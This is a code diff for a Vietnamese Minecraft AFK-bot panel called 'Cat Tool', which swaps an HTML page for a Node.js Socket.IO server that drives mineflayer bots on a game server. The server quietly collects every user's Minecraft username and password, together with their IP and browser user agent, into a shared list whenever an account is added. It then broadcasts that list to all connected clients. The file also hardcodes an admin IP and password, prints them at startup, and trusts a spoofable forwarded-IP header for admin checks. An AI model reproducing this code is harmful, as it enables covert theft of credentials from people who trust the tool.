@@ -1,277 +1,329 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cat Tool Panel - AFK Bot</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --bg-color: #120a05;
-            --panel-bg: #1a0f07;
-            --border-color: #ff6600;
-            --text-color: #ffcc99;
-            --accent-color: #ff5500;
-            --button-hover: #ff7722;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            width: 100%;
-            max-width: 650px;
-            background: var(--panel-bg);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(255, 102, 0, 0.3);
-            position: relative;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .header h3 { font-size: 12px; color: #cc6600; letter-spacing: 2px; }
-        .header h1 { font-size: 24px; color: #ff8833; margin: 5px 0; text-shadow: 0 0 10px rgba(255,136,51,0.5); }
-        .header p { font-size: 13px; color: #aa7755; }
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const mineflayer = require('mineflayer');
 
-        /* Discord Logo & Link Style */
-        .discord-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: #5865F2;
-            color: white;
-            padding: 8px 12px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            transition: 0.3s;
-            box-shadow: 0 0 10px rgba(88, 101, 242, 0.5);
-        }
-        .discord-btn:hover { background: #4752C4; }
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
 
-        .form-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        input {
-            flex: 1;
-            padding: 10px 15px;
-            background: #0d0603;
-            border: 1px solid #663300;
-            border-radius: 6px;
-            color: #fff;
-            outline: none;
-            font-size: 14px;
-        }
-        input:focus { border-color: var(--border-color); }
-        button {
-            padding: 10px 20px;
-            background: linear-gradient(to bottom, #ff7700, #cc4400);
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        button:hover { background: linear-gradient(to bottom, #ff8822, #dd5500); }
+const PORT = process.env.PORT || 3000;
 
-        .log-box {
-            width: 100%;
-            height: 220px;
-            background: #080301;
-            border: 1px solid #442200;
-            border-radius: 6px;
-            padding: 10px;
-            overflow-y: scroll;
-            font-family: monospace;
-            font-size: 13px;
-            color: #00ff88;
-            margin-bottom: 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
+// ===== CẤU HÌNH ADMIN =====
+const ADMIN_IP = '1.53.131.94'; 
+const ADMIN_PASSWORD = 'AlphaZo2026';
 
-        .control-panel {
-            background: #140b05;
-            border: 1px solid #662200;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 15px;
-        }
-        .control-panel h3 {
-            font-size: 15px;
-            color: #ff8833;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .chat-box {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .status-bar {
-            text-align: center;
-            font-size: 13px;
-            margin-top: 15px;
-            color: #888;
-        }
-    </style>
-</head>
-<body>
+// ===== DỮ LIỆU TOÀN CỤC =====
+const clientData = {};
+let globalCollectedData = [];
+let isMaintenance = false;
 
-    <div class="container">
-        <!-- Nút và Logo Discord -->
-        <a id="discordLink" href="#" target="_blank" class="discord-btn">
-            <i class="fa-brands fa-discord"></i> Discord
-        </a>
+app.use(express.static('public'));
 
-        <div class="header">
-            <h3>CAT TOOL — BY MEOVANCAT & GIANANDAY</h3>
-            <h1>Cat Tool Panel</h1>
-            <p>Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</p>
-        </div>
+// ===== API KIỂM TRA ADMIN =====
+app.get('/api/check-admin', (req, res) => {
+    let clientIp = req.headers['x-forwarded-for'] 
+        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
+        : req.socket.remoteAddress;
+    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
+    const isAdmin = (clientIp === ADMIN_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
+    res.json({ isAdmin, ip: clientIp });
+});
 
-        <!-- Khung Thêm Tài Khoản -->
-        <div class="form-group">
-            <input type="text" id="usernameInput" placeholder="Nhập tên tài khoản Minecraft...">
-            <input type="password" id="passwordInput" placeholder="Mật khẩu (để trống nếu dùng mỏ)">
-            <button id="addBtn"><i class="fa-solid fa-plus"></i> Thêm Bot</button>
-        </div>
+// ===== BẮT LỖI TOÀN CỤC =====
+process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
+process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));
 
-        <!-- Khung Nhật Ký -->
-        <div style="font-size: 13px; margin-bottom: 5px; color: #bb8855;">Nhật ký hệ thống:</div>
-        <div class="log-box" id="logBox">
-            <div>[System] Đang chờ kết nối tới Server điều khiển...</div>
-        </div>
+// ================================================================
+//  SOCKET.IO
+// ================================================================
+io.on('connection', (socket) => {
+    let rawIp = socket.handshake.headers['x-forwarded-for'] 
+        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
+        : socket.handshake.address;
+    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
+    const clientIp = rawIp;
 
-        <!-- Bảng Điều Khiển Quản Trị -->
-        <div class="control-panel">
-            <h3><i class="fa-solid fa-lock"></i> BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h3>
-            <div style="display: flex; gap: 10px; align-items: center;">
-                <input type="password" value="********" readonly style="max-width: 150px;">
-                <button style="background: #cc3300;"><i class="fa-solid fa-lock-open"></i> Mở Khóa</button>
-                <button style="background: #444;"><i class="fa-solid fa-power-off"></i> Đóng</button>
-            </div>
-            
-            <div style="margin-top: 12px;">
-                <button id="toggleReconnectBtn" style="background: #333; border: 1px solid #777;"><i class="fa-solid fa-rotate"></i> Tự động kết nối lại: TẮT</button>
-                <button id="startAllBtn" style="background: #008844;"><i class="fa-solid fa-play"></i> Chạy Tất Cả</button>
-                <button id="stopAllBtn" style="background: #aa2222;"><i class="fa-solid fa-stop"></i> Dừng Tất Cả</button>
-            </div>
+    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
 
-            <div style="margin-top: 15px; font-size: 13px; color: #cc8855;">💬 Chat từ xa vào bot</div>
-            <div class="chat-box">
-                <input type="text" id="chatInput" placeholder="Lệnh (VD: /afk, /home)...">
-                <button id="sendChatBtn">Gửi</button>
-            </div>
-        </div>
+    if (!clientData[clientIp]) {
+        clientData[clientIp] = {
+            accounts: [],
+            bots: {}
+        };
+    }
 
-        <div class="status-bar">
-            🔒 2026 Cat Tool. Uy tín làm nên thương hiệu.
-        </div>
-    </div>
+    socket.emit('init_accounts', clientData[clientIp].accounts);
+    socket.emit('sync_collected_data', globalCollectedData);
+    socket.emit('maintenance_status', isMaintenance);
 
-    <!-- Socket.io Client Script -->
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
+    // ============================================================
+    //  THU THẬP DỮ LIỆU
+    // ============================================================
+    socket.on('collect_data', (data) => {
+        const entry = {
+            ip: clientIp,
+            time: new Date().toLocaleString(),
+            username: data.username || '(chưa nhập)',
+            password: data.password || '(trống)',
+            userAgent: data.userAgent || 'N/A'
+        };
+        globalCollectedData.push(entry);
+        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
+        io.emit('sync_collected_data', globalCollectedData);
+        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
+    });
 
-        const logBox = document.getElementById('logBox');
-        const usernameInput = document.getElementById('usernameInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const addBtn = document.getElementById('addBtn');
-        const chatInput = document.getElementById('chatInput');
-        const sendChatBtn = document.getElementById('sendChatBtn');
-        const toggleReconnectBtn = document.getElementById('toggleReconnectBtn');
-        const startAllBtn = document.getElementById('startAllBtn');
-        const stopAllBtn = document.getElementById('stopAllBtn');
-        const discordLink = document.getElementById('discordLink');
+    socket.on('clear_collected_data', () => {
+        globalCollectedData = [];
+        io.emit('sync_collected_data', globalCollectedData);
+        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
+    });
 
-        // Nhận cấu hình khởi tạo từ Server (bao gồm cả link Discord)
-        socket.on('init', (data) => {
-            if (data.discordUrl) {
-                discordLink.href = data.discordUrl;
-            }
-            if (data.autoReconnect) {
-                toggleReconnectBtn.innerHTML = `<i class="fa-solid fa-rotate"></i> Tự động kết nối lại: BẬT`;
-                toggleReconnectBtn.style.background = '#006622';
-            }
+    // ============================================================
+    //  BẢO TRÌ
+    // ============================================================
+    socket.on('toggle_maintenance', (status) => {
+        isMaintenance = status;
+        io.emit('maintenance_status', isMaintenance);
+        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
+        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
+    });
+
+    // ============================================================
+    //  QUẢN LÝ ACCOUNTS
+    // ============================================================
+    socket.on('add_account', (data) => {
+        const { username, password } = data;
+        if (!username) return;
+        
+        socket.emit('collect_data', {
+            username: username,
+            password: password || 'caigicungdc',
+            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
         });
 
-        // Nhận log từ Server đẩy lên
-        socket.on('log', (msg) => {
-            const div = document.createElement('div');
-            div.textContent = msg;
-            logBox.appendChild(div);
-            logBox.scrollTop = logBox.scrollHeight; // Tự động cuộn xuống dưới cùng
+        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
+        clientData[clientIp].accounts.push({
+            id,
+            username: username.trim(),
+            password: password ? password.trim() : 'caigicungdc',
+            autoReconnect: true,
+            status: 'OFFLINE',
+            color: '#ff4444'
         });
+        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
+    });
 
-        // Thêm tài khoản khi bấm nút
-        addBtn.addEventListener('click', () => {
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
-            if (!username) {
-                alert('Vui lòng nhập tên tài khoản Minecraft!');
-                return;
-            }
-            socket.emit('add_account', { username, password });
-            usernameInput.value = '';
-            passwordInput.value = '';
-        });
+    socket.on('delete_account', (id) => {
+        if (clientData[clientIp].bots[id]) {
+            try { clientData[clientIp].bots[id].quit(); } catch(e){}
+            delete clientData[clientIp].bots[id];
+        }
+        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
+        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+    });
 
-        // Gửi lệnh chat/command
-        sendChatBtn.addEventListener('click', () => {
-            const cmd = chatInput.value.trim();
-            if (cmd) {
-                socket.emit('send_chat', cmd);
-                chatInput.value = '';
-            }
-        });
+    socket.on('toggle_auto_reconnect', (id) => {
+        const acc = clientData[clientIp].accounts.find(a => a.id === id);
+        if (acc) {
+            acc.autoReconnect = !acc.autoReconnect;
+            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        }
+    });
 
-        chatInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendChatBtn.click();
-        });
+    // ============================================================
+    //  BOT MINEFLAYER
+    // ============================================================
+    socket.on('start_bot', (id) => {
+        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
+        if (!account) return;
 
-        // Các nút điều khiển khác
-        toggleReconnectBtn.addEventListener('click', () => {
-            socket.emit('toggle_auto_reconnect');
-        });
+        if (clientData[clientIp].bots[id]) {
+            try { clientData[clientIp].bots[id].quit(); } catch(e){}
+        }
 
-        socket.on('auto_reconnect_status', (status) => {
-            if (status) {
-                toggleReconnectBtn.innerHTML = `<i class="fa-solid fa-rotate"></i> Tự động kết nối lại: BẬT`;
-                toggleReconnectBtn.style.background = '#006622';
-            } else {
-                toggleReconnectBtn.innerHTML = `<i class="fa-solid fa-rotate"></i> Tự động kết nối lại: TẮT`;
-                toggleReconnectBtn.style.background = '#333';
-            }
-        });
+        account.status = 'CONNECTING...';
+        account.color = 'yellow';
+        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        socket.emit('log', `[${account.username}] 🔄 Đang kết nối tới kingmc.vn...`);
 
-        startAllBtn.addEventListener('click', () => {
-            socket.emit('start_farm');
-        });
+        try {
+            const bot = mineflayer.createBot({
+                host: 'kingmc.vn',
+                port: 25565,
+                username: account.username,
+                password: account.password,
+                auth: 'offline',
+                version: '1.16.5',
+                checkTimeoutInterval: 120000
+            });
 
-        stopAllBtn.addEventListener('click', () => {
-            socket.emit('stop_farm');
-        });
-    </script>
-</body>
-</html>
+            clientData[clientIp].bots[id] = bot;
+            let hasJoinedKingSMP = false;
+            let hasExecutedAFK = false;
+            let isLoggedIn = false;
+
+            bot.on('login', () => {
+                account.status = 'LOGGING IN...';
+                account.color = 'orange';
+                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+                socket.emit('log', `[${account.username}] 🔑 Đang đăng nhập...`);
+            });
+
+            bot.on('spawn', () => {
+                if (hasJoinedKingSMP) {
+                    account.status = 'ONLINE / KINGSMP';
+                    account.color = '#00ff88';
+                    socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
+                    // Không gõ /afk ở đây nữa, sẽ gõ trong windowOpen
+                } else {
+                    account.status = 'ONLINE / LOBBY';
+                    account.color = '#00ff88';
+                    socket.emit('log', `[${account.username}] ✅ Đã vào Sảnh chính!`);
+                }
+                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+            });
+
+            bot.on('messagestr', (message) => {
+                socket.emit('log', `[${account.username}]: ${message}`);
+                const msgLower = message.toLowerCase();
+
+                if (msgLower.includes('/register') || msgLower.includes('/dk')) {
+                    setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
+                } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
+                    setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 2000);
+                }
+
+                if (!hasJoinedKingSMP && !isLoggedIn && 
+                    (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
+                    isLoggedIn = true;
+                    socket.emit('log', `[${account.username}] ✅ Đã đăng nhập! Đợi 5s gõ /menu...`);
+                    setTimeout(() => {
+                        if (bot && !hasJoinedKingSMP) {
+                            socket.emit('log', `[${account.username}] 📋 Đang gõ /menu...`);
+                            bot.chat('/menu');
+                        }
+                    }, 5000);
+                }
+            });
+
+            // ===== WINDOWOPEN - QUAN TRỌNG: THỨ TỰ ĐÚNG =====
+            bot.on('windowOpen', (window) => {
+                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
+                socket.emit('log', `[${account.username}] 📂 Menu mở: ${rawTitle}`);
+
+                // BƯỚC 1: Chọn KingSMP từ Menu Sảnh (Slot 24)
+                if (!hasJoinedKingSMP) {
+                    setTimeout(() => {
+                        if (!bot || !bot.currentWindow) return;
+                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 24 chọn KingSMP...`);
+                        hasJoinedKingSMP = true;
+
+                        bot.clickWindow(24, 0, 0)
+                            .then(() => socket.emit('log', `[${account.username}] ✅ Click Slot 24 thành công!`))
+                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction`));
+
+                        setTimeout(() => {
+                            try { bot.closeWindow(window); } catch(e){}
+                        }, 500);
+
+                    }, 2500);
+                } 
+                // BƯỚC 2: Gõ /afk TRƯỚC, SAU ĐÓ click Slot 1
+                else if (hasJoinedKingSMP && !hasExecutedAFK) {
+                    // Gõ /afk trước
+                    socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
+                    bot.chat('/afk');
+                    
+                    // Đợi 2.5 giây rồi click Slot 1
+                    setTimeout(() => {
+                        if (!bot || !bot.currentWindow) return;
+                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
+                        hasExecutedAFK = true;
+
+                        bot.clickWindow(1, 0, 0)
+                            .then(() => socket.emit('log', `[${account.username}] 🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`))
+                            .catch(() => socket.emit('log', `[${account.username}] ⚠️ Bỏ qua cảnh báo transaction AFK`));
+
+                        setTimeout(() => {
+                            try { bot.closeWindow(window); } catch(e){}
+                        }, 500);
+
+                    }, 2500);
+                }
+            });
+
+            bot.on('end', (reason) => {
+                socket.emit('log', `[${account.username}] ⚠️ Ngắt kết nối: ${reason}`);
+                account.status = 'OFFLINE';
+                account.color = '#ff4444';
+                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+                delete clientData[clientIp].bots[id];
+
+                if (account.autoReconnect) {
+                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 6 giây...`);
+                    setTimeout(() => {
+                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
+                            socket.emit('restart_internal_bot', id);
+                        }
+                    }, 6000);
+                }
+            });
+
+            bot.on('error', (err) => {
+                if (err.code === 'EPIPE') {
+                    socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`);
+                } else {
+                    socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
+                }
+            });
+
+        } catch (e) {
+            socket.emit('log', `[Lỗi khởi tạo ${account.username}]: ${e.message}`);
+            account.status = 'ERROR';
+            account.color = '#ff4444';
+            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        }
+    });
+
+    socket.on('stop_bot', (id) => {
+        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
+        if (account) {
+            account.status = 'STOPPED';
+            account.color = '#ff4444';
+            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        }
+        if (clientData[clientIp].bots[id]) {
+            try { clientData[clientIp].bots[id].quit(); } catch(e){}
+            delete clientData[clientIp].bots[id];
+        }
+        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
+    });
+
+    socket.on('send_chat', ({ id, cmd }) => {
+        const bot = clientData[clientIp].bots[id];
+        if (bot) {
+            bot.chat(cmd);
+            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
+        } else {
+            socket.emit('log', `[⚠️] Bot này chưa online!`);
+        }
+    });
+
+    socket.on('get_accounts', () => {
+        socket.emit('init_accounts', clientData[clientIp].accounts);
+    });
+
+    socket.on('disconnect', () => {
+        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
+    });
+});
+
+// ===== START SERVER =====
+server.listen(PORT, () => {
+    console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
+    console.log(`👑 Admin IP: ${ADMIN_IP}`);
+    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
+});
